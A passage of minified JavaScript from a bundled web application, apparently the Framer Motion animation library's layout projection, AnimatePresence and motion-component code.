0))}getClosestProjectingParent(){if(!(!this.parent||rl(this.parent.latestValues)||S1(this.parent.latestValues)))return this.parent.isProjecting()?this.parent:this.parent.getClosestProjectingParent()}isProjecting(){return!!((this.relativeTarget||this.targetDelta||this.options.layoutRoot)&&this.layout)}createRelativeTarget(a,o,l){this.relativeParent=a,this.forceRelativeParentToResolveTarget(),this.relativeTarget=Z(),this.relativeTargetOrigin=Z(),qs(this.relativeTargetOrigin,o,l,this.options.layoutAnchor||void 0),He(this.relativeTarget,this.relativeTargetOrigin)}removeRelativeTarget(){this.relativeParent=this.relativeTarget=void 0}calcProjection(){var v;const a=this.getLead(),o=!!this.resumingFrom||this!==a;let l=!0;if((this.isProjectionDirty||(v=this.parent)!=null&&v.isProjectionDirty)&&(l=!1),o&&(this.isSharedProjectionDirty||this.isTransformDirty)&&(l=!1),this.resolvedRelativeTargetAt===ie.timestamp&&(l=!1),l)return;const{layout:u,layoutId:c}=this.options;if(this.isTreeAnimating=!!(this.parent&&this.parent.isTreeAnimating||this.currentAnimation||this.pendingAnimation),this.isTreeAnimating||(this.targetDelta=this.relativeTarget=void 0),!this.layout||!(u||c))return;He(this.layoutCorrected,this.layout.layoutBox);const d=this.treeScale.x,p=this.treeScale.y;yx(this.layoutCorrected,this.treeScale,this.path,o),a.layout&&!a.target&&(this.treeScale.x!==1||this.treeScale.y!==1)&&(a.target=a.layout.layoutBox,a.targetWithTransforms=Z());const{target:g}=a;if(!g){this.prevProjectionDelta&&(this.createProjectionDeltas(),this.scheduleRender());return}!this.projectionDelta||!this.prevProjectionDelta?this.createProjectionDeltas():(Td(this.prevProjectionDelta.x,this.projectionDelta.x),Td(this.prevProjectionDelta.y,this.projectionDelta.y)),Pi(this.projectionDelta,this.layoutCorrected,g,this.latestValues),(this.treeScale.x!==d||this.treeScale.y!==p||!Fd(this.projectionDelta.x,this.prevProjectionDelta.x)||!Fd(this.projectionDelta.y,this.prevProjectionDelta.y))&&(this.hasProjected=!0,this.scheduleRender(),this.notifyListeners("projectionUpdate",g))}hide(){this.isVisible=!1}show(){this.isVisible=!0}scheduleRender(a=!0){var o;if((o=this.options.visualElement)==null||o.scheduleRender(),a){const l=this.getStack();l&&l.scheduleRender()}this.resumingFrom&&!this.resumingFrom.instance&&(this.resumingFrom=void 0)}createProjectionDeltas(){this.prevProjectionDelta=It(),this.projectionDelta=It(),this.projectionDeltaWithTransform=It()}setAnimationOrigin(a,o=!1,l){const u=this.snapshot,c=u?u.latestValues:{},d={...this.latestValues},p=It();(!this.relativeParent||!this.relativeParent.options.layoutRoot)&&(this.relativeTarget=this.relativeTargetOrigin=void 0),this.attemptToResolveRelativeTarget=!o;const g=Z(),v=u?u.source:void 0,x=this.layout?this.layout.source:void 0,b=v!==x,h=this.getStack(),m=!h||h.members.length<=1,f=!!(b&&!m&&this.options.crossfade===!0&&!this.path.some(FS));this.animationProgress=0;let y;const A=l==null?void 0:l.interpolateProjection(a);this.mixTargetDelta=T=>{const S=T/1e3,C=A==null?void 0:A(S);C?(p.x.translate=C.x,p.x.scale=j(a.x.scale,1,S),p.x.origin=a.x.origin,p.x.originPoint=a.x.originPoint,p.y.translate=C.y,p.y.scale=j(a.y.scale,1,S),p.y.origin=a.y.origin,p.y.originPoint=a.y.originPoint):(zd(p.x,a.x,S),zd(p.y,a.y,S)),this.setTargetDelta(p),this.relativeTarget&&this.relativeTargetOrigin&&this.layout&&this.relativeParent&&this.relativeParent.layout&&(qs(g,this.layout.layoutBox,this.relativeParent.layout.layoutBox,this.options.layoutAnchor||void 0),BS(this.relativeTarget,this.relativeTargetOrigin,g,S),y&&cS(this.relativeTarget,y)&&(this.isProjectionDirty=!1),y||(y=Z()),He(y,this.relativeTarget)),b&&(this.animationValues=d,mS(d,c,this.latestValues,S,f,m)),C&&C.rotate!==void 0&&(this.animationValues||(this.animationValues=d),this.animationValues.pathRotation=C.rotate),this.root.scheduleUpdateProjection(),this.scheduleRender(),this.animationProgress=S},this.mixTargetDelta(this.options.layoutRoot?1e3:0)}startAnimation(a){var o,l,u;this.notifyListeners("animationStart"),(o=this.currentAnimation)==null||o.stop(),(u=(l=this.resumingFrom)==null?void 0:l.currentAnimation)==null||u.stop(),this.pendingAnimation&&(Vn(this.pendingAnimation),this.pendingAnimation=void 0),this.pendingAnimation=U.update(()=>{Kr.hasAnimatedSinceResize=!0,this.motionValue||(this.motionValue=Qt(0)),this.motionValue.jump(0,!1),this.currentAnimation=gS(this.motionValue,[0,1e3],{...a,velocity:0,isSync:!0,onUpdate:c=>{this.mixTargetDelta(c),a.onUpdate&&a.onUpdate(c)},onComplete:()=>{a.onComplete&&a.onComplete(),this.completeAnimation()}}),t0(this.currentAnimation,this),this.resumingFrom&&(this.resumingFrom.currentAnimation=this.currentAnimation),this.pendingAnimation=void 0})}completeAnimation(){this.resumingFrom&&(this.resumingFrom.currentAnimation=void 0,this.resumingFrom.preserveOpacity=void 0);const a=this.getStack();a&&a.exitAnimationComplete(),this.resumingFrom=this.currentAnimation=this.animationValues=void 0,this.notifyListeners("animationComplete")}finishAnimation(){this.currentAnimation&&(this.mixTargetDelta&&this.mixTargetDelta(bS),this.currentAnimation.stop()),this.completeAnimation()}applyTransformsToTarget(){const a=this.getLead(),{targetWithTransforms:o,layout:l,latestValues:u}=a;let{target:c}=a;if(!(!o||!c||!l)){if(this!==a&&this.layout&&l&&G1(this.options.animationType,this.layout.layoutBox,l.layoutBox)){c=this.target||Z();const d=ve(this.layout.layoutBox.x);c.x.min=a.target.x.min,c.x.max=c.x.min+d;const p=ve(this.layout.layoutBox.y);c.y.min=a.target.y.min,c.y.max=c.y.min+p}He(o,c),Gr(o,u),Pi(this.projectionDeltaWithTransform,this.layoutCorrected,o,u)}}registerSharedNode(a,o){this.sharedNodes.has(a)||this.sharedNodes.set(a,new SS),this.sharedNodes.get(a).add(o);const u=o.options.initialPromotionConfig;o.promote({transition:u?u.transition:void 0,preserveFollowOpacity:u&&u.shouldPreserveFollowOpacity?u.shouldPreserveFollowOpacity(o):void 0})}isLead(){const a=this.getStack();return a?a.lead===this:!0}getLead(){var o;const{layoutId:a}=this.options;return a?((o=this.getStack())==null?void 0:o.lead)||this:this}getPrevLead(){var o;const{layoutId:a}=this.options;return a?(o=this.getStack())==null?void 0:o.prevLead:void 0}getStack(){const{layoutId:a}=this.options;if(a)return this.root.sharedNodes.get(a)}promote({needsReset:a,transition:o,preserveFollowOpacity:l}={}){const u=this.getStack();u&&u.promote(this,l),a&&(this.projectionDelta=void 0,this.needsReset=!0),o&&this.setOptions({transition:o})}relegate(){const a=this.getStack();return a?a.relegate(this):!1}resetSkewAndRotation(){const{visualElement:a}=this.options;if(!a)return;let o=!1;const{latestValues:l}=a;if((l.z||l.rotate||l.rotateX||l.rotateY||l.rotateZ||l.skewX||l.skewY)&&(o=!0),!o)return;const u={};l.z&&ka("z",a,u,this.animationValues);for(let c=0;c<Fa.length;c++)ka(`rotate${Fa[c]}`,a,u,this.animationValues),ka(`skew${Fa[c]}`,a,u,this.animationValues);a.render();for(const c in u)a.setStaticValue(c,u[c]),this.animationValues&&(this.animationValues[c]=u[c]);a.scheduleRender()}applyProjectionStyles(a,o){if(!this.instance||this.isSVG)return;if(!this.isVisible){a.visibility="hidden";return}const l=this.getTransformTemplate();if(this.needsReset){this.needsReset=!1,a.visibility="",a.opacity="",a.pointerEvents=$r(o==null?void 0:o.pointerEvents)||"",a.transform=l?l(this.latestValues,""):"none";return}const u=this.getLead();if(!this.projectionDelta||!this.layout||!u.target){this.options.layoutId&&(a.opacity=this.latestValues.opacity!==void 0?this.latestValues.opacity:1,a.pointerEvents=$r(o==null?void 0:o.pointerEvents)||""),this.hasProjected&&!Jn(this.latestValues)&&(a.transform=l?l({},""):"none",this.hasProjected=!1);return}a.visibility="";const c=u.animationValues||u.latestValues;this.applyTransformsToTarget();let d=dS(this.projectionDeltaWithTransform,this.treeScale,c);l&&(d=l(c,d)),a.transform=d;const{x:p,y:g}=this.projectionDelta;a.transformOrigin=`${p.origin*100}% ${g.origin*100}% 0`,u.animationValues?a.opacity=u===this?c.opacity??this.latestValues.opacity??1:this.preserveOpacity?this.latestValues.opacity:c.opacityExit:a.opacity=u===this?c.opacity!==void 0?c.opacity:"":c.opacityExit!==void 0?c.opacityExit:0;for(const v in ol){if(c[v]===void 0)continue;const{correct:x,applyTo:b,isCSSVariable:h}=ol[v],m=d==="none"?c[v]:x(c[v],u);if(b){const f=b.length;for(let y=0;y<f;y++)a[b[y]]=m}else h?this.options.visualElement.renderState.vars[v]=m:a[v]=m}this.options.layoutId&&(a.pointerEvents=u===this?$r(o==null?void 0:o.pointerEvents)||"":"none")}clearSnapshot(){this.resumeFrom=this.snapshot=void 0}resetTree(){this.root.nodes.forEach(a=>{var o;return(o=a.currentAnimation)==null?void 0:o.stop()}),this.root.nodes.forEach(Vd),this.root.sharedNodes.clear()}}}function AS(e){e.updateLayout()}function ES(e){var t;const n=((t=e.resumeFrom)==null?void 0:t.snapshot)||e.snapshot;if(e.isLead()&&e.layout&&n&&e.hasListeners("didUpdate")){const{layoutBox:i,measuredBox:r}=e.layout,{animationType:s}=e.options,a=n.source!==e.layout.source;if(s==="size")tn(d=>{const p=a?n.measuredBox[d]:n.layoutBox[d],g=ve(p);p.min=i[d].min,p.max=p.min+g});else if(s==="x"||s==="y"){const d=s==="x"?"y":"x";ll(a?n.measuredBox[d]:n.layoutBox[d],i[d])}else G1(s,n.layoutBox,i)&&tn(d=>{const p=a?n.measuredBox[d]:n.layoutBox[d],g=ve(i[d]);p.max=p.min+g,e.relativeTarget&&!e.currentAnimation&&(e.isProjectionDirty=!0,e.relativeTarget[d].max=e.relativeTarget[d].min+g)});const o=It();Pi(o,i,n.layoutBox);const l=It();a?Pi(l,e.applyTransform(r,!0),n.measuredBox):Pi(l,i,n.layoutBox);const u=!U1(o);let c=!1;if(!e.resumeFrom){const d=e.getClosestProjectingParent();if(d&&!d.resumeFrom){const{snapshot:p,layout:g}=d;if(p&&g){const v=e.options.layoutAnchor||void 0,x=Z();qs(x,n.layoutBox,p.layoutBox,v);const b=Z();qs(b,i,g.layoutBox,v),V1(x,b)||(c=!0),d.options.layoutRoot&&(e.relativeTarget=b,e.relativeTargetOrigin=x,e.relativeParent=d)}}}e.notifyListeners("didUpdate",{layout:i,snapshot:n,delta:l,layoutDelta:o,hasLayoutChanged:u,hasRelativeLayoutChanged:c})}else if(e.isLead()){const{onExitComplete:i}=e.options;i&&i()}e.options.transition=void 0}function PS(e){e.parent&&(e.isProjecting()||(e.isProjectionDirty=e.parent.isProjectionDirty),e.isSharedProjectionDirty||(e.isSharedProjectionDirty=!!(e.isProjectionDirty||e.parent.isProjectionDirty||e.parent.isSharedProjectionDirty)),e.isTransformDirty||(e.isTransformDirty=e.parent.isTransformDirty))}function TS(e){e.isProjectionDirty=e.isSharedProjectionDirty=e.isTransformDirty=!1}function LS(e){e.clearSnapshot()}function Vd(e){e.clearMeasurements()}function RS(e){e.isLayoutDirty=!0,e.updateLayout()}function _d(e){e.isLayoutDirty=!1}function DS(e){e.isAnimationBlocked&&e.layout&&!e.isLayoutDirty&&(e.snapshot=e.layout,e.isLayoutDirty=!0)}function qS(e){var n;e.relativeTarget&&((n=e.relativeParent)!=null&&n.isLayoutDirty)&&(e.currentAnimation?e.isLayoutDirty=!0:(e.targetDelta=void 0,e.removeRelativeTarget()))}function NS(e){const{visualElement:n}=e.options;n&&n.getProps().onBeforeLayoutMeasure&&n.notify("BeforeLayoutMeasure"),e.resetTransform()}function Hd(e){e.finishAnimation(),e.targetDelta=e.relativeTarget=e.target=void 0,e.isProjectionDirty=!0}function IS(e){e.resolveTargetDelta()}function MS(e){e.calcProjection()}function OS(e){e.resetSkewAndRotation()}function wS(e){e.removeLeadSnapshot()}function zd(e,n,t){e.translate=j(n.translate,0,t),e.scale=j(n.scale,1,t),e.origin=n.origin,e.originPoint=n.originPoint}function Gd(e,n,t,i){e.min=j(n.min,t.min,i),e.max=j(n.max,t.max,i)}function BS(e,n,t,i){Gd(e.x,n.x,t.x,i),Gd(e.y,n.y,t.y,i)}function FS(e){return e.animationValues&&e.animationValues.opacityExit!==void 0}const kS={duration:.45,ease:[.4,0,.1,1]},Xd=e=>typeof navigator<"u"&&navigator.userAgent&&navigator.userAgent.toLowerCase().includes(e),Qd=Xd("applewebkit/")&&!Xd("chrome/")?Math.round:Je;function Wd(e){e.min=Qd(e.min),e.max=Qd(e.max)}function jS(e){Wd(e.x),Wd(e.y)}function G1(e,n,t){return e==="position"||e==="preserve-aspect"&&!sS(Bd(n),Bd(t),.2)}function US(e){var n;return e!==e.root&&((n=e.scroll)==null?void 0:n.wasRoot)}const VS=z1({attachResizeListener:(e,n)=>$i(e,"resize",n),measureScroll:()=>{var e,n;return{x:document.documentElement.scrollLeft||((e=document.body)==null?void 0:e.scrollLeft)||0,y:document.documentElement.scrollTop||((n=document.body)==null?void 0:n.scrollTop)||0}},checkIsScrollRoot:()=>!0}),ja={current:void 0},X1=z1({measureScroll:e=>({x:e.scrollLeft,y:e.scrollTop}),defaultParent:()=>{if(!ja.current){const e=new VS({});e.mount(window),e.setOptions({layoutScroll:!0}),ja.current=e}return ja.current},resetTransform:(e,n)=>{e.style.transform=n!==void 0?n:"none"},checkIsScrollRoot:e=>window.getComputedStyle(e).position==="fixed"}),Ou=R.createContext({transformPagePoint:e=>e,isStatic:!1,reducedMotion:"never"});function $d(e,n){if(typeof e=="function")return e(n);e!=null&&(e.current=n)}function _S(...e){return n=>{let t=!1;const i=e.map(r=>{const s=$d(r,n);return!t&&typeof s=="function"&&(t=!0),s});if(t)return()=>{for(let r=0;r<i.length;r++){const s=i[r];typeof s=="function"?s():$d(e[r],null)}}}}function HS(...e){return R.useCallback(_S(...e),e)}class zS extends R.Component{getSnapshotBeforeUpdate(n){const t=this.props.childRef.current;if(zr(t)&&n.isPresent&&!this.props.isPresent&&this.props.pop!==!1){const i=t.offsetParent,r=zr(i)&&i.offsetWidth||0,s=zr(i)&&i.offsetHeight||0,a=getComputedStyle(t),o=this.props.sizeRef.current;o.height=parseFloat(a.height),o.width=parseFloat(a.width),o.top=t.offsetTop,o.left=t.offsetLeft,o.right=r-o.width-o.left,o.bottom=s-o.height-o.top,o.direction=a.direction}return null}componentDidUpdate(){}render(){return this.props.children}}function GS({children:e,isPresent:n,anchorX:t,anchorY:i,root:r,pop:s}){var p;const a=R.useId(),o=R.useRef(null),l=R.useRef({width:0,height:0,top:0,left:0,right:0,bottom:0,direction:"ltr"}),{nonce:u}=R.useContext(Ou),c=s!==!1?((p=e.props)==null?void 0:p.ref)??(e==null?void 0:e.ref):void 0,d=HS(o,c);return R.useInsertionEffect(()=>{const{width:g,height:v,top:x,left:b,right:h,bottom:m,direction:f}=l.current;if(n||s===!1||!o.current||!g||!v)return;const y=f==="rtl",A=t==="left"?y?`right: ${h}`:`left: ${b}`:y?`left: ${b}`:`right: ${h}`,T=i==="bottom"?`bottom: ${m}`:`top: ${x}`;o.current.dataset.motionPopId=a;const S=document.createElement("style");u&&(S.nonce=u);const C=r??document.head;return C.appendChild(S),S.sheet&&S.sheet.insertRule(`
          [data-motion-pop-id="${a}"] {
            position: absolute !important;
            width: ${g}px !important;
            height: ${v}px !important;
            ${A}px !important;
            ${T}px !important;
          }
        `),()=>{var I;(I=o.current)==null||I.removeAttribute("data-motion-pop-id"),C.contains(S)&&C.removeChild(S)}},[n]),E.jsx(zS,{isPresent:n,childRef:o,sizeRef:l,pop:s,children:s===!1?e:R.cloneElement(e,{ref:d})})}const XS=({children:e,initial:n,isPresent:t,onExitComplete:i,custom:r,presenceAffectsLayout:s,mode:a,anchorX:o,anchorY:l,root:u})=>{const c=au(QS),d=R.useId(),p=R.useRef(t),g=R.useRef(i);zi(()=>{p.current=t,g.current=i});let v=!0,x=R.useMemo(()=>(v=!1,{id:d,initial:n,isPresent:t,custom:r,onExitComplete:b=>{c.set(b,!0);for(const h of c.values())if(!h)return;i&&i()},register:b=>(c.set(b,!1),()=>{var h;c.delete(b),!p.current&&!c.size&&((h=g.current)==null||h.call(g))})}),[t,c,i]);return s&&v&&(x={...x}),R.useMemo(()=>{c.forEach((b,h)=>c.set(h,!1))},[t]),R.useEffect(()=>{!t&&!c.size&&i&&i()},[t]),e=E.jsx(GS,{pop:a==="popLayout",isPresent:t,anchorX:o,anchorY:l,root:u,children:e}),E.jsx(Ws.Provider,{value:x,children:e})};function QS(){return new Map}function Q1(e=!0){const n=R.useContext(Ws);if(n===null)return[!0,null];const{isPresent:t,onExitComplete:i,register:r}=n,s=R.useId();R.useEffect(()=>{if(e)return r(s)},[e]);const a=R.useCallback(()=>e&&i&&i(s),[s,i,e]);return!t&&i?[!1,a]:[!0]}const ui=e=>e.key||"";function Kd(e){const n=[];return R.Children.forEach(e,t=>{R.isValidElement(t)&&n.push(t)}),n}const Ki=({children:e,custom:n,initial:t=!0,onExitComplete:i,presenceAffectsLayout:r=!0,mode:s="sync",propagate:a=!1,anchorX:o="left",anchorY:l="top",root:u})=>{const[c,d]=Q1(a),p=R.useMemo(()=>Kd(e),[e]),g=a&&!c?[]:p.map(ui),v=R.useRef(!0),x=au(()=>new Map),b=R.useRef(new Set),[h,m]=R.useState(p),[f,y]=R.useState(p);zi(()=>{a&&!c&&!f.length&&(d==null||d())},[c,a,f.length,d]),zi(()=>{v.current=!1;for(let S=0;S<f.length;S++){const C=ui(f[S]);g.includes(C)?(x.delete(C),b.current.delete(C)):x.get(C)!==!0&&x.set(C,!1)}},[f,g.length,g.join("-")]);const A=[];if(p!==h){let S=[...p],C=0;for(const I of f){const q=g.indexOf(ui(I));q===-1?(S.splice(C++,0,I),A.push(I)):C=q+A.length+1}return A.every(I=>x.get(ui(I)))?S=p:s==="wait"&&(S=A),y(Kd(S)),m(p),null}const{forceRender:T}=R.useContext(su);return E.jsx(E.Fragment,{children:f.map(S=>{const C=ui(S),I=a&&!c?!1:p===f||g.includes(C),q=()=>{if(b.current.has(C))return;if(x.has(C))b.current.add(C),x.set(C,!0);else return;let z=!0;x.forEach(Te=>{Te||(z=!1)}),z&&(T==null||T(),m([]),a&&(d==null||d()),i&&i())};return E.jsx(XS,{isPresent:I,initial:!v.current||t?void 0:!1,custom:n,presenceAffectsLayout:r,mode:s,root:u,onExitComplete:I?void 0:q,anchorX:o,anchorY:l,children:S},C)})})},W1=R.createContext({strict:!1}),Jd={animation:["animate","variants","whileHover","whileTap","exit","whileInView","whileFocus","whileDrag"],exit:["exit"],drag:["drag","dragControls"],focus:["whileFocus"],hover:["whileHover","onHoverStart","onHoverEnd"],tap:["whileTap","onTap","onTapStart","onTapCancel"],pan:["onPan","onPanStart","onPanSessionStart","onPanEnd"],inView:["whileInView","onViewportEnter","onViewportLeave"],layout:["layout","layoutId"]};let Yd=!1;function WS(){if(Yd)return;const e={};for(const n in Jd)e[n]={isEnabled:t=>Jd[n].some(i=>!!t[i])};D1(e),Yd=!0}function $1(){return WS(),_x()}function $S(e){const n=$1();for(const t in e)n[t]={...n[t],...e[t]};D1(n)}const Zs=R.createContext({});function KS(e,n){if(Ys(e)){const{initial:t,animate:i}=e;return{initial:t===!1||Wi(t)?t:void 0,animate:Wi(i)?i:void 0}}return e.inherit!==!1?n:{}}function JS(e){const{initial:n,animate:t}=KS(e,R.useContext(Zs));return R.useMemo(()=>({initial:n,animate:t}),[Zd(n),Zd(t)])}function Zd(e){return Array.isArray(e)?e.join(" "):e}const wu=()=>({style:{},transform:{},transformOrigin:{},vars:{}});function K1(e,n,t){for(const i in n)!ue(n[i])&&!I1(i,t)&&(e[i]=n[i])}function YS({transformTemplate:e},n){return R.useMemo(()=>{const t=wu();return Du(t,n,e),Object.assign({},t.vars,t.style)},[n])}function ZS(e,n){const t=e.style||{},i={};return K1(i,t,e),Object.assign(i,YS(e,n)),i}function eb(e,n){const t={},i=ZS(e,n);return e.drag&&e.dragListener!==!1&&(t.draggable=!1,i.userSelect=i.WebkitUserSelect=i.WebkitTouchCallout="none",i.touchAction=e.drag===!0?"none":`pan-${e.drag==="x"?"y":"x"}`),e.tabIndex===void 0&&(e.onTap||e.onTapStart||e.whileTap)&&(t.tabIndex=0),t.style=i,t}const J1=()=>({...wu(),attrs:{}});function nb(e,n,t,i){const r=R.useMemo(()=>{const s=J1();return y1(s,n,O1(i),e.transformTemplate,e.style),{...s.attrs,style:{...s.style}}},[n]);if(e.style){const s={};K1(s,e.style,e),r.style={...s,...r.style}}return r}const tb=new Set(["animate","exit","variants","initial","style","values","variants","transition","transformTemplate","custom","inherit","onBeforeLayoutMeasure","onAnimationStart","onAnimationComplete","onUpdate","onDragStart","onDrag","onDragEnd","onMeasureDragConstraints","onDirectionLock","onDragTransitionEnd","_dragX","_dragY","onHoverStart","onHoverEnd","onViewportEnter","onViewportLeave","globalTapTarget","propagate","ignoreStrict","viewport"]);function Ns(e){return e.startsWith("while")||e.startsWith("drag")&&e!=="draggable"||e.startsWith("layout")||e.startsWith("onTap")||e.startsWith("onPan")||e.startsWith("onLayout")||tb.has(e)}function ib(e,n){return e.startsWith("on")?!Ns(e):(n==null?void 0:n(e))??!Ns(e)}function rb(e,n,t,i){const r={};for(const s in e)s==="values"&&typeof e.values=="object"||ue(e[s])||(ib(s,i)||t===!0&&Ns(s)||!n&&!Ns(s)||e.draggable&&s.startsWith("onDrag"))&&(r[s]=e[s]);return r}const sb=["animate","circle","defs","desc","ellipse","g","image","line","filter","marker","mask","metadata","path","pattern","polygon","polyline","rect","stop","switch","symbol","svg","text","tspan","use","view"];function Bu(e){return typeof e!="string"||e.includes("-")?!1:!!(sb.indexOf(e)>-1||/[A-Z]/u.test(e))}function ab(e,n,t,{latestValues:i},r,s=!1,a,o){const u=(a??Bu(e)?nb:eb)(n,i,r,e),c=rb(n,typeof e=="string",s,o),d=e!==R.Fragment?{...c,...u,ref:t}:{},{children:p}=n,g=R.useMemo(()=>ue(p)?p.get():p,[p]);return R.createElement(e,{...d,children:g})}function ob({scrapeMotionValuesFromProps:e,createRenderState:n},t,i,r){return{latestValues:lb(t,i,r,e),renderState:n()}}function lb(e,n,t,i){const r={},s=i(e,{});for(const p in s)r[p]=$r(s[p]);let{initial:a,animate:o}=e;const l=Ys(e),u=L1(e);n&&u&&!l&&e.inherit!==!1&&(a===void 0&&(a=n.initial),o===void 0&&(o=n.animate));let c=t?t.initial===!1:!1;c=c||a===!1;const d=c?o:a;if(d&&typeof d!="boolean"&&!Js(d)){const p=Array.isArray(d)?d:[d];for(let g=0;g<p.length;g++){const v=Pu(e,p[g]);if(v){const{transitionEnd:x,transition:b,...h}=v;for(const m in h){let f=h[m];if(Array.isArray(f)){const y=c?f.length-1:0;f=f[y]}f!==null&&(r[m]=f)}for(const m in x)r[m]=x[m]}}}return r}const Y1=e=>(n,t)=>{const i=R.useContext(Zs),r=R.useContext(Ws),s=()=>ob(e,n,i,r);return t?s():au(s)},ub=Y1({scrapeMotionValuesFromProps:Mu,createRenderState:wu}),cb=Y1({scrapeMotionValuesFromProps:w1,createRenderState:J1}),db=Symbol.for("motionComponentSymbol");function pb(e,n,t){const i=R.useRef(t);R.useInsertionEffect(()=>{i.current=t});const r=R.useRef(null);return R.useCallback(s=>{var o;s&&((o=e.onMount)==null||o.call(e,s)),n&&(s?n.mount(s):n.unmount());const a=i.current;if(typeof a=="function")if(s){const l=a(s);typeof l=="function"&&(r.current=l)}else r.current?(r.current(),r.current=null):a(s);else a&&(a.current=s)},[n])}const Z1=R.createContext({});function vt(e){return e&&typeof e=="object"&&Object.prototype.hasOwnProperty.call(e,"current")}function mb(e,n,t,i,r,s){var f,y;const{visualElement:a}=R.useContext(Zs),o=R.useContext(W1),l=R.useContext(Ws),u=R.useContext(Ou),c=u.reducedMotion,d=u.skipAnimations,p=R.useRef(null),g=R.useRef(!1);i=i||o.renderer,!p.current&&i&&(p.current=i(e,{visualState:n,parent:a,props:t,presenceContext:l,blockInitialAnimation:l?l.initial===!1:!1,reducedMotionConfig:c,skipAnimations:d,isSVG:s}),g.current&&p.current&&(p.current.manuallyAnimateOnMount=!0));const v=p.current,x=R.useContext(Z1);v&&!v.projection&&r&&(v.type==="html"||v.type==="svg")&&fb(p.current,t,r,x);const b=R.useRef(!1);R.useInsertionEffect(()=>{v&&b.current&&v.update(t,l)});const h=t[m1],m=R.useRef(!!h&&typeof window<"u"&&!((f=window.MotionHandoffIsComplete)!=null&&f.call(window,h))&&((y=window.MotionHasOptimisedAnimation)==null?void 0:y.call(window,h)));return zi(()=>{var A;!g.current||!v||((A=v.animationState)==null||A.animateChanges(),v.enteringChildren=void 0)},[]),zi(()=>{g.current=!0,v&&(b.current=!0,window.MotionIsMounted=!0,v.updateFeatures(),v.scheduleRenderMicrotask(),m.current&&v.animationState&&v.animationState.animateChanges())}),R.useEffect(()=>{v&&(!m.current&&v.animationState&&v.animationState.animateChanges(),m.current&&(queueMicrotask(()=>{var A;(A=window.MotionHandoffMarkAsComplete)==null||A.call(window,h)}),m.current=!1),v.enteringChildren=void 0)}),v}function fb(e,n,t,i){const{layoutId:r,layout:s,drag:a,dragConstraints:o,layoutScroll:l,layoutRoot:u,layoutAnchor:c,layoutCrossfade:d}=n;e.projection=new t(e.latestValues,n["data-framer-portal-id"]?void 0:eg(e.parent)),e.projection.setOptions({layoutId:r,layout:s,alwaysMeasureLayout:!!a||o&&vt(o),visualElement:e,animationType:typeof s=="string"?s:"both",initialPromotionConfig:i,crossfade:d,layoutScroll:l,layoutRoot:u,layoutAnchor:c})}function eg(e){if(e)return e.options.allowProjection!==!1?e.projection:eg(e.parent)}function Ua(e,{forwardMotionProps:n=!1,type:t}={},i,r){i&&$S(i);const s=t?t==="svg":Bu(e),a=s?cb:ub;function o(u,c){let d;const p={...R.useContext(Ou),...u,layoutId:hb(u)},{isStatic:g,isValidProp:v}=p,x=JS(u),b=a(u,g);if(!g&&typeof window<"u"){gb();const h=vb(p);d=h.MeasureLayout,x.visualElement=mb(e,b,p,r,h.ProjectionNode,s)}return E.jsxs(Zs.Provider,{value:x,children:[d&&x.visualElement?E.jsx(d,{visualElement:x.visualElement,...p}):null,ab(e,u,pb(b,x.visualElement,c),b,g,n,s,v)]})}o.displayName=`motion.${typeof e=="string"?e:`create(${e.displayName??e.name??""})`}`;const l=R.forwardRef(o);return l[db]=e,l}function hb({layoutId:e}){const n=R.useContext(su).id;return n&&e!==void 0?n+"-"+e:e}function gb(e,n){R.useContext(W1).strict}function vb(e){const n=$1(),{drag:t,layout:i}=n;if(!t&&!i)return{};const r={...t,...i};return{MeasureLayout:t!=null&&t.isEnabled(e)||i!=null&&i.isEnabled(e)?r.MeasureLayout:void 0,ProjectionNode:r.ProjectionNode}}function yb(e,n){if(typeof Proxy>"u")return Ua;const t=new Map,i=(s,a)=>Ua(s,a,e,n),r=(s,a)=>i(s,a);return new Proxy(r,{get:(s,a)=>a==="create"?i:(t.has(a)||t.set(a,Ua(a,void 0,e,n)),t.get(a))})}const xb=(e,n)=>n.isSVG??Bu(e)?new Wx(n):new Xx(n,{allowProjection:e!==R.Fragment});class Sb extends Gn{constructor(n){super(n),n.animationState||(n.animationState=Zx(n))}updateAnimationControlsSubscription(){const{animate:n}=this.node.getProps();Js(n)&&(this.unmountControls=n.subscribe(this.node))}mount(){this.updateAnimationControlsSubscription()}update(){const{animate:n}=this.node.getProps(),{animate:t}=this.node.prevProps||{};n!==t&&this.updateAnimationControlsSubscription()}unmount(){var n;this.node.animationState.reset(),(n=this.unmountControls)==null||n.call(this)}}let bb=0;class Cb extends Gn{constructor(){super(...arguments),this.id=bb++,this.isExitComplete=!1}update(){var s;if(!this.node.presenceContext)return;const{isPresent:n,onExitComplete:t}=this.node.presenceContext,{isPresent:i}=this.node.prevPresenceContext||{};if(!this.node.animationState||n===i)return;if(n&&i===!1){if(this.isExitComplete){const{initial:a,custom:o}=this.node.getProps();if(typeof a=="string"||typeof a=="object"&&a!==null&&!Array.isArray(a)){const l=ot(this.node,a,o);if(l){const{transition:u,transitionEnd:c,...d}=l;for(const p in d)(s=this.node.getValue(p))==null||s.jump(d[p])}}this.node.blockInitialAnimation=!1,this.node.animationState.reset(),this.node.animationState.animateChanges()}else this.node.animationState.setActive("exit",!1);this.isExitComplete=!1,this.exitAnimation=void 0;return}const r=this.exitAnimation=this.node.animationState.setActive("exit",!n);t&&!n&&r.then(()=>{this.exitAnimation===r&&(this.isExitComplete=!0,t(this.id))})}mount(){const{register:n,onExitComplete:t}=this.node.presenceContext||{};t&&t(this.id),n&&(this.unmount=n(this.id))}unmount(){}}const Ab={animation:{Feature:Sb},exit:{Feature:Cb}};function ea(e){return{point:{x:e.pageX,y:e.pageY}}}const Eb=e=>n=>Nu(n)&&e(n,ea(n));function Ti(e,n,t,i){return $i(e,n,Eb(t),i)}const ng=({current:e})=>e?e.ownerDocument.defaultView:null,ep=(e,n)=>Math.abs(e-n);function Pb(e,n){const t=ep(e.x,n.x),i=ep(e.y,n.y);return Math.sqrt(t**2+i**2)}const np=new Set(["auto","scroll"]);class tg{constructor(n,t,{transformPagePoint:i,contextWindow:r=window,dragSnapToOrigin:s=!1,distanceThreshold:a=3,element:o}={}){if(this.startEvent=null,this.lastMoveEvent=null,this.lastMoveEventInfo=null,this.lastRawMoveEventInfo=null,this.handlers={},this.contextWindow=window,this.scrollPositions=new Map,this.removeScrollListeners=null,this.onElementScroll=v=>{this.handleScroll(v.target)},this.onWindowScroll=()=>{this.handleScroll(window)},this.updatePoint=()=>{if(!(this.lastMoveEvent&&this.lastMoveEventInfo))return;this.hasPendingMove=!1,this.lastRawMoveEventInfo&&(this.lastMoveEventInfo=Dr(this.lastRawMoveEventInfo,this.transformPagePoint));const 